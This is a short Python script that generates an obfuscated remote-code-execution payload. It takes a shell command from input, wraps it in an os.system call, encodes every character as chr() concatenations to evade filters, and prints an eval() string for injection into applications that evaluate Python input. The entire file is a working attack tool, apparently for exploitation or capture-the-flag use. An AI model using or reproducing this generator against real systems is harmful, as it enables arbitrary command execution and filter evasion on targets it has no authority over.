
command = input("RCE Command: ")

payload = f"__import__('os').system('{command}')"

obfuscated = []

for c in payload:
    obfuscated.append(f"chr({ord(c)})+")

final_payload = f"eval({''.join(obfuscated)}"
print(final_payload[:-1] + ")")